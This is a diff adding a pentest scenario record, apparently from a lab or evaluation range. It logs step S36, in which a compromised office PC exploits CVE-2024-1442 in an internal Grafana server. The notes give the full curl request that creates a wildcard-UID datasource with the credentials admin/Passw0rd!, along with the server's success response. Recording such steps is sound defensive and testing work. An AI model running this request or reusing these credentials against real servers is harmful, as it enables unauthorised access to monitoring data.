@@ -1,0 +1,36 @@
+# Dep-PC (OFFICE, 10.10.40.42) -> Monitoring/Grafana (MGMT, 10.10.50.52:3000).
+# CVE-2024-1442 (CVSS 8.8 HIGH): Grafana datasource API accepts UID="*" (wildcard),
+# granting the creator of that datasource implicit admin access to ALL other datasources
+# (read, query, modify, delete). Confirmed: POST /api/datasources with uid:"*" returns
+# HTTP 200 with {"message":"Datasource added","uid":"*"}, datasource ID 2 created.
+# Grafana 10.2.3 is in the vulnerable range (fix >= 10.2.4 / 9.5.17 / 10.0.9 / 10.1.6).
+# Admin credentials admin/Passw0rd! used (default from CVE-2025-4123 S25 access).
+# Suricata 86601 (ET HUNTING curl User-Agent cross-zone OFFICE->MGMT).
+# Evidence: evaluation/pentest/evidence/s36_grafana_wildcard_uid.txt
+id: S36-deppc-to-grafana-wildcard-uid
+description: Grafana 10.2.3 wildcard datasource UID "*" accepted (CVE-2024-1442 HIGH); dep-pc->monitoring, OFFICE->MGMT.
+start: 2026-11-16T19:58:08Z
+end: 2026-11-16T19:58:09Z
+attacker: dep-pc
+steps:
+  - step: 1
+    start: 2026-11-16T19:58:08Z
+    end: 2026-11-16T19:58:09Z
+    target: Monitoring
+    cve: CVE-2024-1442
+    technique: T1078
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      curl -u admin:Passw0rd! -X POST http://10.10.50.52:3000/api/datasources \
+        -H "Content-Type: application/json" \
+        -d '{"name":"cve-2024-1442-wildcard","type":"prometheus",
+             "url":"http://10.10.30.31:5432","access":"proxy","uid":"*"}'
+        -> {"datasource":{"id":2,"uid":"*","orgId":1,"name":"cve-2024-1442-wildcard",...},
+            "message":"Datasource added"}
+      Grafana 10.2.3 accepted uid:"*" without rejection.
+      CVE-2024-1442: wildcard UID grants the owner implicit access to all datasources.
+      Admin credential obtained from CVE-2025-4123 (S25) default-credential exploit.
+      Grafana version 10.2.3 is in vulnerable range (fix requires >= 10.2.4).
+      evidence s36_grafana_wildcard_uid.txt
